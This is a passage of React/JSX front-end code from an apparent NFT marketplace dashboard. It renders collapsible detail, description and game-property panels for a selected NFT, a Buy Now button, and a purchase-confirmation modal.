                        <div className="py-3 space-y-4">
                            <div onClick={handleDetails} className="w-full flex justify-between items-center">
                                <h3 className="font-medium dark:text-white text-black">Details</h3>
                                {isDetails === true ? (<FaAngleUp className="w-4 text-neutral-400 h-4" />) : (<FaAngleDown className="w-4 text-neutral-400 h-4" />)}
                            </div>

                            {isDetails === true && (<div className="w-full px-3 py-4 dark:bg-isoDark2 rounded-xl bg-[#f5f5f9] duration-500 flex flex-col space-y-5">
                                
                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-neutral-500">Category</p>
                                    <p className="text-black dark:text-white">{selectedNFT.details.category}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-neutral-500">Creator</p>
                                    <p className="text-black dark:text-white">{selectedNFT.details.creator}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-neutral-500">Owner</p>
                                    <p className="text-black dark:text-white">{selectedNFT.details.owner}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-neutral-500">Token ID</p>
                                    <p className="text-black dark:text-white">{selectedNFT.details.tokenID}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-neutral-500">Network</p>
                                    <p className="text-black dark:text-white">{selectedNFT.details.network}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-neutral-500">Contract Address</p>
                                    <p className="text-black dark:text-white">{selectedNFT.details.contractAddress}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-neutral-500">Royaity Fee</p>
                                    <p className="text-black dark:text-white">{selectedNFT.details.royaityFee}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-neutral-500">Platform Fee</p>
                                    <p className="text-black dark:text-white">{selectedNFT.details.platformFee}</p>
                                </div>

                            </div>)}
                        </div>

                        <div className="py-3 space-y-4">
                            <div onClick={handleDescription} className="w-full flex justify-between items-center">
                                <h3 className="font-medium dark:text-white text-black">Description</h3>
                                {isDescription === true ? (<FaAngleUp className="w-4 text-neutral-400 h-4" />) : (<FaAngleDown className="w-4 text-neutral-400 h-4" />)}
                            </div>

                            {isDescription === true && (<div className="w-full dark:bg-isoDark2 px-3 py-4 rounded-xl bg-[#f5f5f9] duration-500 flex flex-col space-y-5">
                                
                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-black dark:text-white">{selectedNFT.description}</p>
                                </div>

                            </div>)}
                        </div>

                        <div className="py-3 space-y-4">
                            <div onClick={handleProperties} className="w-full flex justify-between items-center">
                                <h3 className="font-medium dark:text-white text-black">Properties</h3>
                                {isProperties === true ? (<FaAngleUp className="w-4 text-neutral-400 h-4" />) : (<FaAngleDown className="w-4 text-neutral-400 h-4" />)}
                            </div>

                            {isProperties === true && (<div className="w-full dark:bg-isoDark2 px-3 py-4 rounded-xl bg-[#f5f5f9] duration-500 flex flex-col space-y-5">
                                
                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">win</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.win}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">fiveElement</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.fiveElement}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">hp</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.hp}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">skills</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.skills}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">star</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.star}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">generations</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.generations}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">lose</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.lose}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">atk</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.atk}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">experience</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.experience}</p>
                                </div>

                                <div className="w-full flex items-center justify-between text-xs">
                                    <p className="text-isoColor1 dark:text-isoColor2">grade</p>
                                    <p className="text-black dark:text-white">{selectedNFT.properties.grade}</p>
                                </div>

                            </div>)}
                        </div>

                        <div className='sticky bottom-6 w-full px-0 md:px-4 right-0 left-0'>
                                    <button
                                        onClick={() => setStep(3)}
                                        type="button"
                                        className="w-full py-4 rounded-lg dark:text-black dark:bg-isoColor2 bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                        >
                                        Buy Now
                                    </button>
                        </div>

                    </div>
                )}

                {step === 4 && (
                                    <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 container mx-auto justify-center bg-black/70 items-center loading-modal">
                                                <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 bg-white dark:bg-isoDark2 dark:text-white space-y-4">
                                                  <div className='flex justify-center items-center w-full'><LuArrowDownToLine className='w-16 text-isoColor1 dark:text-isoColor2 h-16' /></div>
                                    
                                                  <h1 className='px-6 text-lg font-medium text-center md:font-semibold'>Deposit Request was Successful!</h1>
                                    
                                                  <p className='text-xs text-center'>
                                                    The NFT purchase request you made has been successful sent. {process.env.NEXT_PUBLIC_COMPANY_NAME} is processing your transaction and you'll be notified went the verification is completed. Thank you.
                                                  </p>
                                
                                                  <a
                                                    href="/dashboard/nft"
                                                    className="w-full py-3 dark:bg-isoColor2 dark:text-black text-center rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                  >
                                                          OK
                                                  </a>
                                                </div>
                                    </div>
                )}

                </div>

          </div>

        </div>

        {step === 1 && ( <Footer tab={`nft`} />)}

       
    </div>
  )
}
//{step === 1 && ( <Footer tab={`nft`} />)}
